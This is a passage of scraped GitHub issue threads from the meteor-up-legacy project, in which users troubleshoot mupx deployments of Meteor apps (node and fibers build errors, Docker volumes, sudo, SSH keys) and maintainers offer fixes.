i used [this option](https://themeteorchef.com/snippets/using-npm-packages/#tmc-adding-an-npm-package-with-meteorhacksnpm) - Adding an NPM package with meteorhacks:npm
</Body>
    </Comment>
    <Comment>
      <Owner>xanderv87</Owner>
      <Body>And no the problem also occurs with a fresh install of meteor (1.3.4.4) ... any idea on where to look for a solution?
</Body>
    </Comment>
    <Comment>
      <Owner>gVolop</Owner>
      <Body>oh no! the problem occurs again!!
any idea???? 
</Body>
    </Comment>
    <Comment>
      <Owner>janjackson</Owner>
      <Body>got a similar issue. What do you think could be the reason? For me, I only added two packages and upgraded to meteor 1.4. After undoing these changes the problem persists. Any hint welcome :)
</Body>
    </Comment>
    <Comment>
      <Owner>gVolop</Owner>
      <Body>for me - down to 1.3.4.1 version solved the problem.
i don't have an idea what can be the reason :(
</Body>
    </Comment>
    <Comment>
      <Owner>romaad</Owner>
      <Body>I tried everything but still having this issues. any news ?
</Body>
    </Comment>
    <Comment>
      <Owner>gVolop</Owner>
      <Body>nothing :(
keep away from meteor-update ...
</Body>
    </Comment>
    <Comment>
      <Owner>romaad</Owner>
      <Body>for me I'm working on 3 meteor apps and collaborating with 2 other friends
two apps is meteor 1.3.5 and one is 1.3.4.
the weird thing is that they can upload the exact same code with the exact same nodejs/mupx version and I can't. and I can't upload a single app from the 3 :smiley: 
</Body>
    </Comment>
    <Comment>
      <Owner>drrodio</Owner>
      <Body>Hi all,

I had exactly the same problem. I think the problem is the compatibility between your local system and remote server.
In my case, I work with Ubuntu 15.10 and Debian server, I get GLIBC_2.14 problem.
Try to deploy the project directly from server, I think it works

Good luck
</Body>
    </Comment>
    <Comment>
      <Owner>gVolop</Owner>
      <Body>for me, the problem occurred because the incompatible versions between node and meteor.
meteor 1.4 work with node 4.4.7, but node version installed by mupx is 0.10.34, different from meteor project version - same in local and remote,
so even if my local node version was 4.4.7 so it's works with meteor 1.4 project, when i tried to deployed - it crashed. 

the new mupx project solved this problem. 

[https://github.com/meteor/meteor/issues/7475](https://github.com/meteor/meteor/issues/7475)
</Body>
    </Comment>
  </Issue_111>
  <Issue_112>
    <Repository>meteor-up-legacy</Repository>
    <Title>uploading files</Title>
    <Owner>arunoda</Owner>
    <Body>Hi guys,

I have this issue:

i want to upload files to the server, from my meteor app.
the files are being uploaded inside the docker container, and not directly on the server. each time I redeploy my app with new features, all the uploaded files are lost, since mupx creates a new docker container.

Is there a way to solve this thing? or is there a right way where to save all the files?

P.S.: i'm using the tomi:upload-server package
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>The docker container gets run with a volume mount here
https://github.com/arunoda/meteor-up/blob/mupx/templates/linux/start.sh#L26
And here
https://github.com/arunoda/meteor-up/blob/mupx/templates/linux/start.sh#L38
Look at the script above to see where the files go...
/opt/APPNAME/current/bundle/*

You should be able to put a persistant folder mount from S3 or whatever on the target instance there somehow depending on your cloud provider and subsiquent target instance.
Then it should persist etc. Anyway you'll figure it out from this hint.
</Body>
    </Comment>
    <Comment>
      <Owner>nick-preda</Owner>
      <Body>Thanks for the quick reply.

I'll explain better:
I want to upload files from my app, with the package to a certain path on my server.

What the package does, is uploading the files to the local container, which is for every re-deploy different:

`/var/lib/docker/aufs/mnt/HUGE-60-OR-MORE-CHAR-ID/desired/path/i/chose`

so for every re-deploy the path changes, and moreover, the files are deleted from the previous path.

don't really get it how to put a persistent folder mount
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I'm not sure if it's been added yet or not but I remember talk about providing your own paths ( via mup settings ) to be added via the --volume arguments in the new version being ported to kadirahq/meteor-up 
As to mounting persistant drives on a target instance it's different for all providers but some consistance exists for instance CoreOS uses cloud-config.yml or AWS has block-device-mapping on CLI and a Web Console way, you'll have to research it.
The random ID in mnt is definitly slightly confusing but I imagine you can mount something directly over that mnt folder or maybe a parent folder, other then going directly to the root device /dev/sda1 (or what-have-you) itself.
You could customize (via your private PR or hack npm install folders of mupx) to change the location I pointed to earlier to add another volume argument with some other folder from the target instance so it will appear in the docker container but since the target instance is fleeting (no pun intended) you will likely want a persistent volume mounted somewhere somehow, unless you run your own metal/hardware.
</Body>
    </Comment>
    <Comment>
      <Owner>nick-preda</Owner>
      <Body>@MasterJames as written in [this](https://www.digitalocean.com/community/tutorials/how-to-work-with-docker-data-volumes-on-ubuntu-14-04) digitalocean tutorial, docker has to be created in this way

`docker run -d -v ~/nginxlogs:/var/log/nginx -p 5000:80 -i nginx` 

where you tell the docker that the local data from its own volume (/var/log/nginx) has to be shared with the host's machine folder ~/nginxlogs

P.S.: the other parameters, like the ports and nginx, are not important here
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Works for me! I always end up rolling my own too.
</Body>
    </Comment>
    <Comment>
      <Owner>nick-preda</Owner>
      <Body>it has to be somehow implemented in the roots of mup, to have a shareable folder.
i wouldn't know how to implement it now, as the docker id is always a random one
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I think you can simple connect by label from ps command it would be "nginx" in your case
https://docs.docker.com/engine/reference/commandline/ps/
but I didn't think that's related to telling it to mount a folder you have that's persistent?
</Body>
    </Comment>
  </Issue_112>
  <Issue_113>
    <Repository>meteor-up-legacy</Repository>
    <Title>Docker link other containers and custom mongo setup</Title>
    <Owner>arunoda</Owner>
    <Body>What is the recommended way to add custom options to the docker run step? I have a couple of things I need to add like linking other containers and mounting a volume (I have some other non-meteor code that needs to be present in the meteor container). 

Also - how do you specify custom mongo oplog url and mongo url? via the env options and setting setup mongo to false?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Setting your own MongoDB is in the docs and other issues. Self explainitory.

Only the new version at kadirahq/meteor-up has the customizable options you seek... I think. I'm not sure it's documented though so maybe ask there. Or search the merged PRs there maybe first.
Otherwise use this mupx as a guide to learn and customize for your needs but remember there won't be any more PRs accepted here so it's better to work with the new one so your efforts will be something yoy can give back to the community if you choose to.
</Body>
    </Comment>
  </Issue_113>
  <Issue_114>
    <Repository>meteor-up-legacy</Repository>
    <Title>Multiple different apps on same server with mupx and Ubuntu 16.04</Title>
    <Owner>arunoda</Owner>
    <Body>I installed mupx using `sudo npm install mupx -g` on Digital Ocean instance of Ubuntu 16.04.

I am deploying multiple meteor apps on the same server. When I restart the system, strangely only one of them is active at startup.

I'm having to go to each one of the apps and explicitly start them using `mupx start`.

How does the start of meteor apps work on system restart? (looks like upstart is no longer being used)

Where can I debug why the apps are not starting at the time of system startup?

Please help.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>mupx uses docker. Take a few days to familiarize with docker.
See docker run to access containers via bash etc.
Consider multiple setup files for multiple deployments.
Note the new version is located at kadirahq/meteor-up 
Also after loads of backups update everything. Maybe refresh setup databases etc. too.
</Body>
    </Comment>
  </Issue_114>
  <Issue_115>
    <Repository>meteor-up-legacy</Repository>
    <Title>mupx deploy fails to build without logging any details</Title>
    <Owner>arunoda</Owner>
    <Body>I am trying to deploy a meteor app on the same server that is running a Ghost blog.  Running &lt;code&gt;mupx setup&lt;/code&gt; works just fine, but when I try to run &lt;code&gt;mupx deploy&lt;/code&gt;, I get the following output:

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Meteor app path    : /root/Story
Using buildOptions : {}

=&gt; Build Error. Check the logs printed above.
```

I'm not sure what this means, especially considering there doesn't seem to be any errors logged at all!  Any ideas?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Y a this basically means one of the packages does not include or build binaries for the target platform.
The newer version of meteor are addressing this. I think as of meteor 1.3.2.4 so you probably need to update everything possible. Package versions etc. Possibly delete the node_modules folder. Can't be certain of any of it without better errors.
If you lookup mupx DEBUG logging it might report something more. It's something like DEBUG=\* mupx deploy  watch your space and often I get the =\* mixed up so double check that syntax.
</Body>
    </Comment>
    <Comment>
      <Owner>patsobo</Owner>
      <Body>Alright, so I ran &lt;code&gt;npm update&lt;/code&gt; inside my meteor project directory, and I checked inside my .meteor/release file and it said I was at meteor 1.3.2.4.  I still got the same error as above.  Running &lt;code&gt;DEBUG=\* mupx deploy&lt;/code&gt; also didn't print out anything more.

I also deleted the node_modules folder by running the following inside my meteor project directory:

```
rm -rf node_modules/
npm install
```

Still no luck.  As a note, my server has Node v4.4.2 running, which Ghost also uses.

I even tried killing Ghost and seeing if it would work then using &lt;code&gt;pkill node&lt;/code&gt;, but this, again, changed nothing.  I'm not sure what else to try besides completely removing Ghost (which I _really_ don't want to do).
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Bummer. Maybe try a test with default meteor just to make sure there's nothing else in the way.
That way you can inject the module and see if it fails.
Alternatively one can hack break points into the scripts/fork to see how far it gets and essentially manually step through to isolate the problem and see better logging.
Maybe try building via full meteor install etc manually on the target platform just to see if that reveals anything.
It could be dependencies of dependencies if that makes any sense? 
</Body>
    </Comment>
  </Issue_115>
  <Issue_116>
    <Repository>meteor-up-legacy</Repository>
    <Title>mup.json should support pointing to server directories for ssl key files to allow auto-renewal</Title>
    <Owner>arunoda</Owner>
    <Body>Setting up Let's encrypt is super easy as it is, however, you have to copy the files to your development dir.
Let's encrypt is only valid for 90 days. Setting up a renewal is also super easy, but requires a manual copy to your dev dir (or an overengineered CI build script!)

What if there was a way to point to a server directory? Or are there ways to do this that I'm not aware of?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>There should be loads of docker containers to sort that out if you aren't comfortable with the script setup.
Just remember to be in test mode before you use up your limit.
Here's one not that I've tested it. It depends on your setup anyway.

https://github.com/JrCs/docker-letsencrypt-nginx-proxy-companion

I imagine you just run a docker instance with your target folder mounted where it also finds settings etc.
</Body>
    </Comment>
  </Issue_116>
  <Issue_117>
    <Repository>meteor-up-legacy</Repository>
    <Title>Invoking deployment process FAILED</Title>
    <Owner>arunoda</Owner>
    <Body>I am getting the following error when deploying my meteor app on a virtual machine hosted in azure:

```
Started TaskList: Deploy app 'meteor' (linux)
[13.76.211.162] - Uploading bundle
[13.76.211.162] - Uploading bundle: SUCCESS
[13.76.211.162] - Setting up Environment Variables
[13.76.211.162] - Setting up Environment Variables: SUCCESS
[13.76.211.162] - Invoking deployment process
[13.76.211.162] x Invoking deployment process: FAILED

        -----------------------------------STDERR-----------------------------------
        ory field.
        npm WARN package.json meteor-dev-bundle@0.0.0 No README data
        ../src/coroutine.cc: In function &#8216;void* find_thread_id_key(void*)&#8217;:
        ../src/coroutine.cc:64:53: warning: comparison of unsigned expression &gt;= 0 is always true [-Wtype-limits]
          for (pthread_key_t ii = coro_thread_key - 1; ii &gt;= 0; --ii) {
                                                             ^
        ../src/coroutine.cc:90:3: warning: &#8216;thread_id&#8217; may be used uninitialized in this function [-Wmaybe-uninitialized]
           if (tls == thread_id) {
           ^
        npm WARN cannot run in wd meteor-dev-bundle@0.0.0 node npm-rebuild.js (wd=/opt/meteor/tmp/bundle/programs/server)
        stop: Unknown instance:
          % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                         Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
        App did not pick up! Please check app logs.
        -----------------------------------STDOUT-----------------------------------
        mp/bundle/programs/server/node_modules/fibers/bin/linux-x64-v8-3.14/fibers.node`
        ansi-regex@0.2.1 node_modules/ansi-regex

        ansi-styles@1.1.0 node_modules/ansi-styles

        escape-string-regexp@1.0.5 node_modules/escape-string-regexp

        chalk@0.5.1 node_modules/chalk

        has-ansi@0.1.0 node_modules/has-ansi

        strip-ansi@0.3.0 node_modules/strip-ansi

        supports-color@0.2.0 node_modules/supports-color

        eachline@2.3.3 node_modules/eachline

        type-of@2.0.1 node_modules/type-of

        amdefine@1.0.0 node_modules/amdefine

        asap@2.0.3 node_modules/asap

        underscore@1.5.2 node_modules/underscore

        meteor-promise@0.5.1 node_modules/meteor-promise

        promise@7.0.4 node_modules/promise

        source-map-support@0.3.2 node_modules/source-map-support

        semver@4.1.0 node_modules/semver

        source-map@0.1.32 node_modules/source-map

        fibers@1.0.5 node_modules/fibers
        Waiting for MongoDB to initialize. (5 minutes)
        connected
        meteor start/running, process 13265
        Waiting for 15 seconds while app is booting up
        Checking is app booted or not?
        ----------------------------------------------------------------------------
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>j6k4m8</Owner>
      <Body>My first suggestion is to try increasing the wait-time from 15 seconds to something longer, like 30 &#8212; it's possible the virtual machine is taking some extra time to process the bundle.
</Body>
    </Comment>
  </Issue_117>
  <Issue_118>
    <Repository>meteor-up-legacy</Repository>
    <Title>Build failed: nodejs not found??</Title>
    <Owner>arunoda</Owner>
    <Body>Really confused by this error. Did `mupx setup &amp;&amp; mupx deploy` and got this:

```
    -----------------------------------STDERR-----------------------------------
    es/npm/node_modules/node-gyp/bin/node-gyp.js" "rebuild" "--release"
    gyp ERR! cwd /bundle/bundle/programs/server/node_modules/fibers
    gyp ERR! node -v v0.10.43
    gyp ERR! node-gyp -v v1.0.1
    gyp ERR! not ok
    Build failed
    sh: 1: nodejs: not found

    npm ERR! fibers@1.0.8 install: `node build.js || nodejs build.js`
    npm ERR! Exit status 127
    npm ERR!
    npm ERR! Failed at the fibers@1.0.8 install script.
    npm ERR! This is most likely a problem with the fibers package,
    npm ERR! not with npm itself.
    npm ERR! Tell the author that this fails on your system:
    npm ERR!     node build.js || nodejs build.js
    npm ERR! You can get their info via:
    npm ERR!     npm owner ls fibers
    npm ERR! There is likely additional logging output above.
    npm ERR! System Linux 3.13.0-57-generic
    npm ERR! command "/usr/bin/node" "/usr/bin/npm" "i"
    npm ERR! cwd /bundle/bundle/programs/server
    npm ERR! node -v v0.10.43
    npm ERR! npm -v 1.4.29
    npm ERR! code ELIFECYCLE
    npm ERR! not ok code 0
```

Literally was fine yesterday -- is this indicating that node isn't installed in the docker image??
</Body>
    <State>open</State>
    <Comment>
      <Owner>dominicarrojado</Owner>
      <Body>Have the same issue! Yesterday was fine too.
</Body>
    </Comment>
    <Comment>
      <Owner>tima101</Owner>
      <Body>Same here. Today: Verifying deployment: Failed. But worked yesterday.
Changing "deployCheckWaitTime" does not help.
</Body>
    </Comment>
    <Comment>
      <Owner>dominicarrojado</Owner>
      <Body>Somehow I was able to deploy now @tima101 @aspin
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Must be a networking issue.
</Body>
    </Comment>
  </Issue_118>
  <Issue_119>
    <Repository>meteor-up-legacy</Repository>
    <Title>Mup Setup rmx2 and sudo x2</Title>
    <Owner>arunoda</Owner>
    <Body>Hi, 
I seem to be having the following issue everytime I try and setup my mup:
## Meteor Up: Production Quality Meteor Deployments

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Started TaskList: Setup (linux)
[198.1.83.82] - Installing Node.js
[198.1.83.82] x Installing Node.js: FAILED

```
-----------------------------------STDERR-----------------------------------
rm: cannot remove `/var/lib/dpkg/lock': No such file or directory
rm: cannot remove `/var/cache/apt/archives/lock': No such file or directory
sudo: dpkg: command not found
sudo: apt-get: command not found
-----------------------------------STDOUT-----------------------------------
----------------------------------------------------------------------------
```

I'm new to mup and meteor and simply want to deploy a react project I made... I don't know why but every method of deploying that I've tried has failed.. I just want to deploy it into my Bluehost server. 

bellow is my mup.json:

{
  // Server authentication info
  "servers": [
    {
      "host": "************_",(hiding these)
      "username": "**_*********_",(hiding these)
      "password": "**_*********!"(hiding these)
    }
  ],

  // Install MongoDB on the server. Does not destroy the local MongoDB on future setups
  "setupMongo": true,

  "setupNode": true,

  "nodeVersion": "0.10.36",

  "setupPhantom": true,

  "enableUploadProgressBar": true,

  // Application name (no spaces).
  "appName": "react",

  // Location of app (local directory). This can reference '~' as the users home directory.
  // i.e., "app": "~/Meteor/my-app",
  // This is the same as the line below.
  "app": "/Users/*************_/**_********",(hiding these)

  // Configure environment
  // ROOT_URL must be set to your correct domain (https or http)
  "env": {
    "ROOT_URL": "http://beta.************.com",(hiding these)
    "MONGO_URL": "mongodb://arunoda:fd8dsjsfh7@hanso.mongohq.com:10023/MyApp"
  },

  // Meteor Up checks if the app comes online just after the deployment.
  // Before mup checks that, it will wait for the number of seconds configured below.
  "deployCheckWaitTime": 35,

  // show a progress bar while uploading. 
  // Make it false when you deploy using a CI box.
  "enableUploadProgressBar": true
}

Please let me know how to fix this, I've googled everything I could on the topic :S
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>First try setting the node version in settings set to 0.10.40 not 36
Note kadirahq/meteor-up is the new version.
</Body>
    </Comment>
    <Comment>
      <Owner>theone581</Owner>
      <Body>another error
using https://github.com/arunoda/meteor-up/tree/mupx

****\* = hidden

****_-**_**-Pro-2:meteor-up ****_$ sudo npm link
npm WARN lifecycle mup@1.0.0~prepublish: cannot run in wd %s %s (wd=%s) mup@1.0.0 nofat make /Users/_***_/**_**/meteor-up
npm ERR! Darwin 15.5.0
npm ERR! argv "/usr/local/bin/node" "/usr/local/bin/npm" "link"
npm ERR! node v4.4.3
npm ERR! npm  v3.8.6
npm ERR! path /usr/local/bin/mup
npm ERR! code EEXIST

npm ERR! Refusing to delete /usr/local/bin/mup: ../lib/node_modules/mup/bin/mup symlink target is not controlled by npm /Users/****_/**_**/meteor-up
npm ERR! File exists: /usr/local/bin/mup
npm ERR! Move it away, and try again.

npm ERR! Please include the following file with any support request:
npm ERR!     /Users/***_/**_**/meteor-up/npm-debug.log

see attached debug.log

[lol.txt](https://github.com/arunoda/meteor-up/files/290324/lol.txt)
</Body>
    </Comment>
    <Comment>
      <Owner>aa21</Owner>
      <Body>Hi @theone581, did you figure out how to solve this? I'm having the same issue:

```

Started TaskList: Setup (linux)
[100.166.230.84] - Installing Node.js
[100.166.230.84] x Installing Node.js: FAILED

    -----------------------------------STDERR-----------------------------------
    bash: line 4: sudo: command not found
    bash: line 5: sudo: command not found
    bash: line 6: sudo: command not found
    bash: line 10: sudo: command not found
    -----------------------------------STDOUT-----------------------------------
    ----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>If you SSH into your target machine and type 
`which sudo`
Does it find one? Like /usr/bin/sudo
Only Ubuntu 14+ is supported.
</Body>
    </Comment>
    <Comment>
      <Owner>aa21</Owner>
      <Body>@MasterJames Thanks. My machine is a new Debian from DigitalOcean. You were right, Sudo wasn't installed. After installing sudo on target machine, "mup setup" is working on my local machine. 

If I figure out how to set up meteor on Debian properly I'll post back here.
</Body>
    </Comment>
  </Issue_119>
  <Issue_120>
    <Repository>meteor-up-legacy</Repository>
    <Title>additional dependency on imagemagick</Title>
    <Owner>arunoda</Owner>
    <Body>Our meteor app has an additional dependency on imagemagick. How do I configure this on mupx?

Is there are post deployment hook I can take advantage of or would you suggest another method?

PS: Out meteor app is based on reactioncommerce.com project
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You will need to make a custom dockers image, which is only possible with the new version at kadirahq/meteor-up 
There are various threads to be found that are from people with the same problem.
</Body>
    </Comment>
  </Issue_120>
  <Issue_121>
    <Repository>meteor-up-legacy</Repository>
    <Title>mupx failed to deploy on new/bare server</Title>
    <Owner>arunoda</Owner>
    <Body>```
$ mupx setup

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json


Started TaskList: Setup (linux)
[188.166.190.228] - Installing Docker
[188.166.190.228] - Installing Docker: SUCCESS
[188.166.190.228] - Setting up Environment
[188.166.190.228] - Setting up Environment: SUCCESS
[188.166.190.228] - Copying MongoDB configuration
[188.166.190.228] - Copying MongoDB configuration: SUCCESS
[188.166.190.228] - Installing MongoDB
[188.166.190.228] - Installing MongoDB: SUCCESS

$ mupx deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

Meteor app path    : /Users/acamarata/Sites/sunnah
Using buildOptions : {}

Started TaskList: Deploy app 'sunnah' (linux)
[188.166.190.228] - Uploading bundle
[188.166.190.228] - Uploading bundle: SUCCESS
[188.166.190.228] - Sending environment variables
[188.166.190.228] - Sending environment variables: SUCCESS
[188.166.190.228] - Initializing start script
[188.166.190.228] - Initializing start script: SUCCESS
[188.166.190.228] - Invoking deployment process
[188.166.190.228] - Invoking deployment process: SUCCESS
[188.166.190.228] - Verifying deployment
[188.166.190.228] x Verifying deployment: FAILED

    -----------------------------------STDERR-----------------------------------
     run:
    npm WARN deprecated 
    npm WARN deprecated   npm -g install npm@latest
    npm WARN deprecated 
    npm WARN deprecated (Depending on how Node.js was installed on your system, you
    npm WARN deprecated may need to prefix the preceding commands with `sudo`, or if
    npm WARN deprecated on Windows, run them from an Administrator prompt.)
    npm WARN deprecated 
    npm WARN deprecated If you're running the version of npm bundled with
    npm WARN deprecated Node.js 0.10 LTS, be aware that the next version of 0.10 LTS
    npm WARN deprecated will be bundled with a version of npm@2, which has some small
    npm WARN deprecated backwards-incompatible changes made to `npm run-script` and
    npm WARN deprecated semver behavior.
    npm WARN package.json meteor-dev-bundle@0.0.0 No description
    npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
    npm WARN package.json meteor-dev-bundle@0.0.0 No README data

    &gt; fibers@1.0.8 install /bundle/bundle/programs/server/node_modules/fibers
    &gt; node build.js || nodejs build.js

    -----------------------------------STDOUT-----------------------------------

    To see more logs type 'mup logs --tail=50'

    ----------------------------------------------------------------------------

$ mupx logs --tail=50

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

[188.166.190.228] Error: `/bundle/bundle/programs/server/node_modules/fibers/bin/linux-x64-v8-3.14/fibers.node` is missing. Try reinstalling `node-fibers`?
[188.166.190.228]     at Object.&lt;anonymous&gt; (/bundle/bundle/programs/server/node_modules/fibers/fibers.js:16:8)
[188.166.190.228]     at Module._compile (module.js:456:26)
[188.166.190.228]     at Object.Module._extensions..js (module.js:474:10)
[188.166.190.228]     at Module.load (module.js:356:32)
[188.166.190.228]     at Function.Module._load (module.js:312:12)
[188.166.190.228]     at Module.require (module.js:364:17)
[188.166.190.228]     at require (module.js:380:17)
[188.166.190.228]     at Object.&lt;anonymous&gt; (/bundle/bundle/programs/server/boot.js:1:75)
[188.166.190.228]     at Module._compile (module.js:456:26)
[188.166.190.228]     at Object.Module._extensions..js (module.js:474:10)
[188.166.190.228] npm WARN deprecated This version of npm lacks support for important features,
[188.166.190.228] npm WARN deprecated such as scoped packages, offered by the primary npm
[188.166.190.228] npm WARN deprecated registry. Consider upgrading to at least npm@2, if not the
[188.166.190.228] npm WARN deprecated latest stable version. To upgrade to npm@2, run:
[188.166.190.228] npm WARN deprecated 
[188.166.190.228] npm WARN deprecated   npm -g install npm@latest-2
[188.166.190.228] npm WARN deprecated 
[188.166.190.228] npm WARN deprecated To upgrade to the latest stable version, run:
[188.166.190.228] npm WARN deprecated 
[188.166.190.228] npm WARN deprecated   npm -g install npm@latest
[188.166.190.228] npm WARN deprecated 
[188.166.190.228] npm WARN deprecated (Depending on how Node.js was installed on your system, you
[188.166.190.228] npm WARN deprecated may need to prefix the preceding commands with `sudo`, or if
[188.166.190.228] npm WARN deprecated on Windows, run them from an Administrator prompt.)
[188.166.190.228] npm WARN deprecated 
[188.166.190.228] npm WARN deprecated If you're running the version of npm bundled with
[188.166.190.228] npm WARN deprecated Node.js 0.10 LTS, be aware that the next version of 0.10 LTS
[188.166.190.228] npm WARN deprecated will be bundled with a version of npm@2, which has some small
[188.166.190.228] npm WARN deprecated backwards-incompatible changes made to `npm run-script` and
[188.166.190.228] npm WARN deprecated semver behavior.
[188.166.190.228] npm WARN package.json meteor-dev-bundle@0.0.0 No description
[188.166.190.228] npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
[188.166.190.228] npm WARN package.json meteor-dev-bundle@0.0.0 No README data
[188.166.190.228] =&gt; Starting meteor app on port:80
[188.166.190.228] 
[188.166.190.228] /bundle/bundle/programs/server/node_modules/fibers/fibers.js:16
[188.166.190.228]   throw new Error('`'+ modPath+ '.node` is missing. Try reinstalling `node-fibe
[188.166.190.228]         ^
[188.166.190.228] Error: `/bundle/bundle/programs/server/node_modules/fibers/bin/linux-x64-v8-3.14/fibers.node` is missing. Try reinstalling `node-fibers`?
[188.166.190.228]     at Object.&lt;anonymous&gt; (/bundle/bundle/programs/server/node_modules/fibers/fibers.js:16:8)
[188.166.190.228]     at Module._compile (module.js:456:26)
[188.166.190.228]     at Object.Module._extensions..js (module.js:474:10)
[188.166.190.228]     at Module.load (module.js:356:32)
[188.166.190.228]     at Function.Module._load (module.js:312:12)
[188.166.190.228]     at Module.require (module.js:364:17)
[188.166.190.228]     at require (module.js:380:17)
[188.166.190.228]     at Object.&lt;anonymous&gt; (/bundle/bundle/programs/server/boot.js:1:75)
[188.166.190.228]     at Module._compile (module.js:456:26)
[188.166.190.228]     at Object.Module._extensions..js (module.js:474:10)
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Try setting your node version to 0.10.40 
https://github.com/arunoda/meteor-up/issues/852
Also. ..
If you update to meteor 1.3.2.4+ it will also help and finally sometimes extending the deploy wait time to about 120 helps too at the final stage (but in this case it's not that initial assumption.)
</Body>
    </Comment>
  </Issue_121>
  <Issue_122>
    <Repository>meteor-up-legacy</Repository>
    <Title>Make access to FileSystem possible</Title>
    <Owner>arunoda</Owner>
    <Body>It would be nice if there would be an easy way to write files to the local file system.

Even a small thing like creating a file with webshot and make it downloadable seems impossible with mupx if you're not using S3 or another extern solution or if you don't want to modifiy the mupx package.

It seems that there is even no temp dir like /temp or /tmp the application is able to write to.

I've found this solution - I think it would work but maybe there is a more recommend way to solve this.
https://github.com/arunoda/meteor-up/issues/914
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Might be possible or make a good question or suggestion with the devs of the new version at kadirahq/meteor-up? 
</Body>
    </Comment>
  </Issue_122>
  <Issue_123>
    <Repository>meteor-up-legacy</Repository>
    <Title>SSH private key file is invalid</Title>
    <Owner>arunoda</Owner>
    <Body>I need to connect to my digitalocean server. That requires a SSH key that I have on my machine `~/.ssh/id_rsa`. However meteor-up wants a pem file?! 

Here's my configuration:

``` json
{
  "servers": [
    {
      "host": "x.x.x.x",
      "username": "root",
      "pem": "~/.ssh/id_rsa",
      "env": {}
    }
  ],

  "setupMongo": true,
  "appName": "web",
  "app": "~/Projects/......./web",
  "env": {
    "PORT": 80,
    "ROOT_URL": "http://x.x.x.x"
  },
  "deployCheckWaitTime": 15,
  "enableUploadProgressBar": true
}
```

When I run the `sudo mupx setup` command I get this:

``` bash
l0oky@laptop:~/Projects/......./web-deploy$ sudo mupx setup
[sudo] password for l0oky: 

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

Invalid configuration file mup.json: SSH private key file is invalid
```

I don't see a reason why would It be invalid because I am using it to ssh into my server...
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You have to concatenate them together or something like that.
You'll figure it out.
http://stackoverflow.com/questions/991758/how-to-get-an-openssl-pem-file-from-key-and-crt-files
</Body>
    </Comment>
  </Issue_123>
  <Issue_124>
    <Repository>meteor-up-legacy</Repository>
    <Title>MongoDB version option to mup.json</Title>
    <Owner>arunoda</Owner>
    <Body>## Proposed changes
- add mup.json "mongoVersion" option to select MongoDB version to be installed

@arunoda please review, this would help to choose sysadmin to choose compatible DB version, MDG does not have yet driver for latest 3.2

Thanks for awesome tool for Meteor deployments!
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>mongoVersion is great but I instictivly feel the default should reference latest or current (which ever is correct/works).
Of course for the new version at kadirahq if it's not already included there.
Changing to mupd ! ? Doubtful that's what they want there but maybe that makes sense. Oh wait it's not a daemon so I would disagree with that name change. It's back to mup there.
</Body>
    </Comment>
    <Comment>
      <Owner>jykae</Owner>
      <Body>Yeah, wasn't sure what could be good default, latest or would it be good to throw error and ask user to check and define it?

These 3 commits should have been only for my own fork, sorry about that. I will cleanup this mess..
Name change helps distinct the tools, we have mup in use on 1 server, mupx is used mostly, and mupd to separate my own version.

Basically in this PR I propose only to have mongoVersion option, for situations when Mongo releases new breaking changes and Meteor is not yet ready for that.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Well yes mine I called mupz. I would do it in the new kadirahq version because there's no point to add PRs to a depreciated version that the devs basically don't monitor. I just take the time to break the bad news to people so you'really not left wondering and waiting.  
They want and love community support and help with these kind of useful ideas, but of course ask there and see first if there isn't already a way or see if there's another plan that needs consideration.
It's of course getting harder for this meteor 1.2 focused version to meet the modern changing needs of meteor 1.3+ and beyond. 
</Body>
    </Comment>
  </Issue_124>
  <Issue_125>
    <Repository>meteor-up-legacy</Repository>
    <Title>change server via update</Title>
    <Owner>arunoda</Owner>
    <Body>hi. I have a native app running on a amazon aws running with IP A. I have setup a new Instance with my app and IP B. My current App version is pointing to Server A but I would like to change the Server IP to B for my current App users. 

I guess when I just update the App Store builds and my clients update the app (a real update no hot code push) they still have the connection to server A when the app was not killed on the phone.

Is it possible to Update server A with mupx to change the mobile-server IP to server B? So when I see there is no traffic on server A anymore but on Server B I know that most of my users are now connected to server B and I can shutdown my Instance A.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe do it with DNS and wait for a shortened timeout.
